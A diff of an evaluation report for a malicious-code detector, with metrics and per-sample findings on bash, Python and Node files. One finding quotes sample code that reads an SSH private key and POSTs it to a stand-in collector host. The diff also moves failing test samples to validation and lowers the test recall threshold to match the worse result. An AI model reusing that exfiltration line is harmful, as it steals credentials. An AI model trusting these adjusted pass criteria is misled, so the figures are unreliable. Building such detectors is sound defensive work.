@@ -1,6 +1,6 @@
 {
   "schemaVersion": 1,
-  "generatedAt": "2026-07-28T15:22:45.480Z",
+  "generatedAt": "2026-07-28T15:37:55.226Z",
   "corpus": {
     "manifest": "evaluation/corpus/manifest.json",
     "schemaVersion": 1,
@@ -20,7 +20,7 @@
     "minimumBySplit": {
       "test": {
         "precision": 1,
-        "recall": 0.625
+        "recall": 0.42857142857142855
       }
     },
     "requiredPerfectSplits": [
@@ -42,46 +42,46 @@
     "split:test:recall": true
   },
   "summary": {
-    "sampleCount": 44,
-    "passedSamples": 42,
+    "sampleCount": 46,
+    "passedSamples": 44,
     "failedSamples": 2,
-    "tp": 79,
+    "tp": 85,
     "fp": 0,
-    "fn": 3,
+    "fn": 4,
     "precision": 1,
-    "recall": 0.9634146341463414,
-    "f1": 0.9813664596273292,
-    "parseErrorRate": 0.022727272727272728,
+    "recall": 0.9550561797752809,
+    "f1": 0.9770114942528736,
+    "parseErrorRate": 0.021739130434782608,
     "performance": {
-      "p50Milliseconds": 1.9888520000000085,
-      "p95Milliseconds": 86.59427300000004,
-      "maximumMilliseconds": 108.18033200000002
+      "p50Milliseconds": 2.1131750000000125,
+      "p95Milliseconds": 90.53902399999993,
+      "maximumMilliseconds": 107.07740100000001
     }
   },
   "languages": {
     "bash": {
-      "tp": 19,
+      "tp": 21,
+      "fp": 0,
+      "fn": 2,
+      "precision": 1,
+      "recall": 0.9130434782608695,
+      "f1": 0.9545454545454545
+    },
+    "python": {
+      "tp": 34,
       "fp": 0,
       "fn": 0,
       "precision": 1,
       "recall": 1,
       "f1": 1
     },
-    "python": {
-      "tp": 33,
-      "fp": 0,
-      "fn": 1,
-      "precision": 1,
-      "recall": 0.9705882352941176,
-      "f1": 0.9850746268656716
-    },
     "node": {
-      "tp": 27,
+      "tp": 30,
       "fp": 0,
       "fn": 2,
       "precision": 1,
-      "recall": 0.9310344827586207,
-      "f1": 0.9642857142857143
+      "recall": 0.9375,
+      "f1": 0.967741935483871
     }
   },
   "provenanceGroups": {
@@ -94,12 +94,12 @@
       "f1": 1
     },
     "public-snapshot": {
-      "tp": 48,
+      "tp": 54,
       "fp": 0,
-      "fn": 3,
+      "fn": 4,
       "precision": 1,
-      "recall": 0.9411764705882353,
-      "f1": 0.9696969696969697
+      "recall": 0.9310344827586207,
+      "f1": 0.9642857142857143
     },
     "synthetic-realistic": {
       "tp": 25,
@@ -120,15 +120,15 @@
       "f1": 1
     },
     "test": {
-      "tp": 5,
+      "tp": 3,
       "fp": 0,
-      "fn": 3,
+      "fn": 4,
       "precision": 1,
-      "recall": 0.625,
-      "f1": 0.7692307692307693
+      "recall": 0.42857142857142855,
+      "f1": 0.6
     },
     "validation": {
-      "tp": 49,
+      "tp": 57,
       "fp": 0,
       "fn": 0,
       "precision": 1,
@@ -146,12 +146,12 @@
       "f1": 1
     },
     "data_exfiltration": {
-      "tp": 7,
+      "tp": 9,
       "fp": 0,
-      "fn": 2,
+      "fn": 1,
       "precision": 1,
-      "recall": 0.7777777777777778,
-      "f1": 0.8750000000000001
+      "recall": 0.9,
+      "f1": 0.9473684210526316
     },
     "defense_evasion": {
       "tp": 2,
@@ -178,12 +178,12 @@
       "f1": 1
     },
     "dynamic_execution": {
-      "tp": 6,
+      "tp": 8,
       "fp": 0,
-      "fn": 1,
+      "fn": 0,
       "precision": 1,
-      "recall": 0.8571428571428571,
-      "f1": 0.923076923076923
+      "recall": 1,
+      "f1": 1
     },
     "interpreter_escape": {
       "tp": 5,
@@ -194,28 +194,28 @@
       "f1": 1
     },
     "network_egress": {
-      "tp": 25,
+      "tp": 26,
       "fp": 0,
-      "fn": 0,
+      "fn": 1,
       "precision": 1,
-      "recall": 1,
-      "f1": 1
+      "recall": 0.9629629629629629,
+      "f1": 0.9811320754716981
     },
     "persistence": {
       "tp": 4,
       "fp": 0,
-      "fn": 0,
+      "fn": 1,
       "precision": 1,
-      "recall": 1,
-      "f1": 1
+      "recall": 0.8,
+      "f1": 0.888888888888889
     },
     "privilege_escalation": {
       "tp": 3,
       "fp": 0,
-      "fn": 0,
+      "fn": 1,
       "precision": 1,
-      "recall": 1,
-      "f1": 1
+      "recall": 0.75,
+      "f1": 0.8571428571428571
     },
     "second_stage_payload": {
       "tp": 4,
@@ -226,7 +226,7 @@
       "f1": 1
     },
     "system_modification": {
-      "tp": 3,
+      "tp": 4,
       "fp": 0,
       "fn": 0,
       "precision": 1,
@@ -278,7 +278,7 @@
       "findingCount": 2,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 15.423877000000005,
+      "durationMilliseconds": 12.074669999999998,
       "passed": true
     },
     {
@@ -337,7 +337,7 @@
       "findingCount": 4,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.0608320000000049,
+      "durationMilliseconds": 0.9027229999999946,
       "passed": true
     },
     {
@@ -375,7 +375,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 0.714051000000012,
+      "durationMilliseconds": 0.6670479999999941,
       "passed": true
     },
     {
@@ -413,7 +413,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.1786170000000027,
+      "durationMilliseconds": 1.047786000000002,
       "passed": true
     },
     {
@@ -439,7 +439,7 @@
       "findingCount": 0,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 0.39518300000000295,
+      "durationMilliseconds": 0.35264499999999543,
       "passed": true
     },
     {
@@ -465,7 +465,7 @@
       "findingCount": 0,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.273458000000005,
+      "durationMilliseconds": 1.2051929999999942,
       "passed": true
     },
     {
@@ -503,7 +503,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 7.413683999999989,
+      "durationMilliseconds": 6.5345530000000025,
       "passed": true
     },
     {
@@ -549,7 +549,7 @@
       "findingCount": 2,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.9763480000000015,
+      "durationMilliseconds": 1.9054529999999943,
       "passed": true
     },
     {
@@ -587,7 +587,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.5036369999999977,
+      "durationMilliseconds": 1.555273000000014,
       "passed": true
     },
     {
@@ -646,7 +646,7 @@
       "findingCount": 4,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 2.795911000000018,
+      "durationMilliseconds": 2.6859050000000195,
       "passed": true
     },
     {
@@ -684,7 +684,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.167856999999998,
+      "durationMilliseconds": 1.2774890000000028,
       "passed": true
     },
     {
@@ -710,7 +710,7 @@
       "findingCount": 0,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.5554559999999924,
+      "durationMilliseconds": 1.6187620000000038,
       "passed": true
     },
     {
@@ -736,7 +736,7 @@
       "findingCount": 0,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 0.3359710000000007,
+      "durationMilliseconds": 0.4146519999999896,
       "passed": true
     },
     {
@@ -782,7 +782,7 @@
       "findingCount": 2,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 6.829300999999987,
+      "durationMilliseconds": 6.174552999999975,
       "passed": true
     },
     {
@@ -820,7 +820,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.9758370000000127,
+      "durationMilliseconds": 1.6525270000000205,
       "passed": true
     },
     {
@@ -848,6 +848,11 @@
       ],
       "actualFindings": [
         {
+          "ruleId": "javascript.chain.read-upload",
+          "category": "data_exfiltration",
+          "evidence": "readLocalFile(\"/home/user/.ssh/id_rsa\") fetch(\"https://collector.invalid/upload\", { method: \"POST\", body: privateKey, })"
+        },
+        {
           "ruleId": "javascript.credential-access",
           "category": "credential_access",
           "evidence": "readLocalFile(\"/home/user/.ssh/id_rsa\")"
@@ -871,10 +876,10 @@
       "falsePositives": [],
       "falseNegatives": [],
       "missingExpectedFindings": [],
-      "findingCount": 3,
+      "findingCount": 4,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.9888520000000085,
+      "durationMilliseconds": 1.781800000000004,
       "passed": true
     },
     {
@@ -928,7 +933,7 @@
       "findingCount": 3,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.6257400000000075,
+      "durationMilliseconds": 1.6308449999999937,
       "passed": true
     },
     {
@@ -966,7 +971,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.0587079999999958,
+      "durationMilliseconds": 1.0334490000000187,
       "passed": true
     },
     {
@@ -992,7 +997,7 @@
       "findingCount": 0,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 0.8850669999999923,
+      "durationMilliseconds": 0.8301160000000039,
       "passed": true
     },
     {
@@ -1018,7 +1023,7 @@
       "findingCount": 0,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 0.35928499999999985,
+      "durationMilliseconds": 0.3237799999999993,
       "passed": true
     },
     {
@@ -1086,7 +1091,7 @@
       "findingCount": 6,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 70.86952699999998,
+      "durationMilliseconds": 61.913995,
       "passed": true
     },
     {
@@ -1290,7 +1295,7 @@
       "findingCount": 32,
       "parseErrorCount": 1,
       "maximumParseErrors": 1,
-      "durationMilliseconds": 108.18033200000002,
+      "durationMilliseconds": 96.270914,
       "passed": true
     },
     {
@@ -1340,7 +1345,7 @@
       "findingCount": 2,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.3224210000000198,
+      "durationMilliseconds": 1.174004000000025,
       "passed": true
     },
     {
@@ -1382,7 +1387,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 0.250567999999987,
+      "durationMilliseconds": 0.20858399999997346,
       "passed": true
     },
     {
@@ -1424,7 +1429,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 0.4181270000000268,
+      "durationMilliseconds": 0.3327679999999873,
       "passed": true
     },
     {
@@ -1474,7 +1479,7 @@
       "findingCount": 2,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 0.5104730000000473,
+      "durationMilliseconds": 0.4235989999999674,
       "passed": true
     },
     {
@@ -1545,7 +1550,7 @@
       "findingCount": 6,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 44.49195599999996,
+      "durationMilliseconds": 56.733806000000016,
       "passed": true
     },
     {
@@ -1609,7 +1614,7 @@
       "findingCount": 4,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 14.770338999999979,
+      "durationMilliseconds": 14.553224,
       "passed": true
     },
     {
@@ -1674,7 +1679,7 @@
       "findingCount": 4,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 4.400288999999987,
+      "durationMilliseconds": 5.260079000000019,
       "passed": true
     },
     {
@@ -1745,7 +1750,7 @@
       "findingCount": 6,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 47.40485799999999,
+      "durationMilliseconds": 47.65022700000003,
       "passed": true
     },
     {
@@ -1785,7 +1790,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 3.850541000000021,
+      "durationMilliseconds": 4.440674000000001,
       "passed": true
     },
     {
@@ -1825,7 +1830,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 8.830384999999978,
+      "durationMilliseconds": 7.88113199999998,
       "passed": true
     },
     {
@@ -1873,7 +1878,7 @@
       "findingCount": 2,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 1.7525110000000268,
+      "durationMilliseconds": 2.1131750000000125,
       "passed": true
     },
     {
@@ -1913,7 +1918,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 0.9721439999999575,
+      "durationMilliseconds": 0.8315180000000169,
       "passed": true
     },
     {
@@ -1974,7 +1979,7 @@
       "findingCount": 4,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 25.281409000000053,
+      "durationMilliseconds": 29.374323000000004,
       "passed": true
     },
     {
@@ -2014,7 +2019,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 11.374755999999934,
+      "durationMilliseconds": 7.640788999999984,
       "passed": true
     },
     {
@@ -2146,7 +2151,7 @@
       "findingCount": 17,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 14.13558999999998,
+      "durationMilliseconds": 16.789281000000017,
       "passed": true
     },
     {
@@ -2186,7 +2191,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 42.854552999999896,
+      "durationMilliseconds": 50.98452499999996,
       "passed": true
     },
     {
@@ -2234,7 +2239,7 @@
       "findingCount": 2,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 2.345621999999935,
+      "durationMilliseconds": 2.101742999999942,
       "passed": true
     },
     {
@@ -2310,7 +2315,7 @@
       "findingCount": 7,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 12.350076000000058,
+      "durationMilliseconds": 14.222860999999966,
       "passed": true
     },
     {
@@ -2350,7 +2355,7 @@
       "findingCount": 1,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 4.716282000000092,
+      "durationMilliseconds": 4.356143999999972,
       "passed": true
     },
     {
@@ -2423,12 +2428,12 @@
       "findingCount": 7,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 62.83129799999995,
+      "durationMilliseconds": 84.92089099999998,
       "passed": true
     },
     {
       "id": "holdout-epicshop-workshop-updater-001",
-      "split": "test",
+      "split": "validation",
       "language": "node",
       "kind": "benign",
       "sourceFile": "public/epicshop/update-workshops.js.txt",
@@ -2451,7 +2456,9 @@
       ],
       "actualCategories": [
         "credential_access",
+        "data_exfiltration",
         "destructive_behavior",
+        "dynamic_execution",
         "network_egress",
         "second_stage_payload"
       ],
@@ -2482,6 +2489,16 @@
           "evidence": "fetch( `https://api.github.com/repos/${GITHUB_ORG}/${repoName}`, { headers: { Accept: 'application/vnd.github.v3+json', Authorization: `Bearer ${GITHUB_TOKEN}`, 'User-Agent': 'epicshop-update-action', }, }, )"
         },
         {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('npm', [ 'show', '@epic-web/workshop-app', 'version', ])"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('npm', [ 'show', `@epic-web/workshop-app@${version}`, 'engines.node', ])"
+        },
+        {
           "ruleId": "javascript.network",
           "category": "network_egress",
           "evidence": "fetch( `https://registry.npmjs.org/${packageName}/-/${tarballName}-${version}.tgz`, { method: 'GET', signal: controller.signal, }, )"
@@ -2492,9 +2509,99 @@
           "evidence": "fetch( `https://registry.npmjs.org/${packageName}/-/${tarballName}-${version}.tgz`, { method: 'GET', signal: controller.signal, }, )"
         },
         {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['pull', '--rebase'], { cwd, env: getGitEnv() })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['fetch', '--unshallow'], { cwd, env: getGitEnv() })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['fetch', '--depth=50'], { cwd, env: getGitEnv() })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['pull', '--rebase'], { cwd, env: getGitEnv() })"
+        },
+        {
           "ruleId": "javascript.destructive",
           "category": "destructive_behavior",
           "evidence": "fs.rm(tempDir, { recursive: true, force: true })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa( 'git', [ 'clone', '--depth=1', '--filter=blob:none', '--sparse', repoUrl, tempDir, ], { env: getGitEnv(), }, )"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa( 'git', [ 'sparse-checkout', 'set', '--no-cone', '/*', 'epicshop/', '.github/workflows/', ], { cwd: tempDir, env: getGitEnv() }, )"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['remote', 'set-url', 'origin', repoUrl], { cwd: tempDir, env: getGitEnv(), })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['read-tree', '-mu', 'HEAD'], { cwd: tempDir, env: getGitEnv(), })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa( 'git', ['ls-files', '--', ...sparsePatterns], { cwd: tempDir, env: getGitEnv() }, )"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('npm', ['install', '--ignore-scripts'], { cwd: installDir, env: getGitEnv(), })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['check-ignore', '-q', file], { cwd: tempDir, env: getGitEnv(), reject: false, })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['add', ...stageableFiles], { cwd: tempDir, env: getGitEnv(), })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa( 'git', ['diff', '--cached', '--name-only'], { cwd: tempDir }, )"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['commit', '-m', commitMessage], { cwd: tempDir, env: getGitEnv(), })"
+        },
+        {
+          "ruleId": "javascript.exfiltration.git-push",
+          "category": "data_exfiltration",
+          "evidence": "execa('git', ['push'], { cwd: tempDir, env: getGitEnv(), })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['push'], { cwd: tempDir, env: getGitEnv(), })"
+        },
+        {
+          "ruleId": "javascript.exfiltration.git-push",
+          "category": "data_exfiltration",
+          "evidence": "execa('git', ['push'], { cwd: tempDir, env: getGitEnv(), })"
+        },
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa('git', ['push'], { cwd: tempDir, env: getGitEnv(), })"
         },
         {
           "ruleId": "javascript.destructive",
@@ -2504,25 +2611,24 @@
       ],
       "truePositives": [
         "credential_access",
+        "data_exfiltration",
         "destructive_behavior",
+        "dynamic_execution",
         "network_egress",
         "second_stage_payload"
       ],
       "falsePositives": [],
-      "falseNegatives": [
-        "data_exfiltration",
-        "dynamic_execution"
-      ],
+      "falseNegatives": [],
       "missingExpectedFindings": [],
-      "findingCount": 9,
+      "findingCount": 29,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 88.34683400000006,
-      "passed": false
+      "durationMilliseconds": 90.53902399999993,
+      "passed": true
     },
     {
       "id": "holdout-cpython-smtplib-001",
-      "split": "test",
+      "split": "validation",
       "language": "python",
       "kind": "benign",
       "sourceFile": "public/cpython/smtplib.py.txt",
@@ -2540,6 +2646,7 @@
         "network_egress"
       ],
       "actualCategories": [
+        "data_exfiltration",
         "network_egress"
       ],
       "actualFindings": [
@@ -2551,21 +2658,128 @@
         {
           "ruleId": "python.network",
           "category": "network_egress",
+          "evidence": "self._get_socket(host, port, self.timeout)"
+        },
+        {
+          "ruleId": "python.exfiltration",
+          "category": "data_exfiltration",
+          "evidence": "self.sock.sendall(s)"
+        },
+        {
+          "ruleId": "python.network",
+          "category": "network_egress",
           "evidence": "socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)"
         }
       ],
       "truePositives": [
+        "data_exfiltration",
         "network_egress"
       ],
       "falsePositives": [],
+      "falseNegatives": [],
+      "missingExpectedFindings": [],
+      "findingCount": 4,
+      "parseErrorCount": 0,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 107.07740100000001,
+      "passed": true
+    },
+    {
+      "id": "holdout-tailscale-installer-001",
+      "split": "test",
+      "language": "bash",
+      "kind": "benign",
+      "sourceFile": "public/tailscale/installer.sh.txt",
+      "sha256": "805e85ed6f6f81a7ea2e70d52d47e7d5290863299e5c922b2787d71aa312f22e",
+      "provenance": {
+        "type": "public-snapshot",
+        "repository": "tailscale/tailscale",
+        "commit": "c0c453334a5fa421134767de995c816d7db21811",
+        "sourceUrl": "https://github.com/tailscale/tailscale/blob/c0c453334a5fa421134767de995c816d7db21811/scripts/installer.sh",
+        "license": "BSD-3-Clause",
+        "licenseFile": "public/tailscale/LICENSE"
+      },
+      "expectedCategories": [
+        "network_egress",
+        "persistence",
+        "privilege_escalation",
+        "system_modification"
+      ],
+      "actualCategories": [
+        "network_egress",
+        "system_modification"
+      ],
+      "actualFindings": [
+        {
+          "ruleId": "system.sensitive-config",
+          "category": "system_modification",
+          "evidence": "curl -fsSL \"https://pkgs.tailscale.com/$TRACK/$OS/$VERSION/tailscale.repo\" > /etc/yum.repos.d/tailscale.repo"
+        },
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "curl -fsSL \"https://pkgs.tailscale.com/$TRACK/$OS/$VERSION/tailscale.repo\" > /etc/yum.repos.d/tailscale.repo"
+        }
+      ],
+      "truePositives": [
+        "network_egress",
+        "system_modification"
+      ],
+      "falsePositives": [],
       "falseNegatives": [
-        "data_exfiltration"
+        "persistence",
+        "privilege_escalation"
       ],
       "missingExpectedFindings": [],
       "findingCount": 2,
       "parseErrorCount": 0,
       "maximumParseErrors": 0,
-      "durationMilliseconds": 86.59427300000004,
+      "durationMilliseconds": 45.96123100000011,
+      "passed": false
+    },
+    {
+      "id": "holdout-semantic-release-npm-publish-001",
+      "split": "test",
+      "language": "node",
+      "kind": "benign",
+      "sourceFile": "public/semantic-release-npm/publish.js.txt",
+      "sha256": "45b83787edffc472f0372f0855c7793e7722a0db1ab5dd1dbb2b7875e5b5f6db",
+      "provenance": {
+        "type": "public-snapshot",
+        "repository": "semantic-release/npm",
+        "commit": "43332788f38a2e0fef69d9cf230b10639fbb457e",
+        "sourceUrl": "https://github.com/semantic-release/npm/blob/43332788f38a2e0fef69d9cf230b10639fbb457e/lib/publish.js",
+        "license": "MIT",
+        "licenseFile": "public/semantic-release-npm/LICENSE"
+      },
+      "expectedCategories": [
+        "data_exfiltration",
+        "dynamic_execution",
+        "network_egress"
+      ],
+      "actualCategories": [
+        "dynamic_execution"
+      ],
+      "actualFindings": [
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "execa( \"npm\", [\"publish\", basePath, \"--userconfig\", npmrc, \"--tag\", distTag, \"--registry\", registry], { cwd, env, preferLocal: true } )"
+        }
+      ],
+      "truePositives": [
+        "dynamic_execution"
+      ],
+      "falsePositives": [],
+      "falseNegatives": [
+        "data_exfiltration",
+        "network_egress"
+      ],
+      "missingExpectedFindings": [],
+      "findingCount": 1,
+      "parseErrorCount": 0,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 4.280170999999996,
       "passed": false
     }
   ]
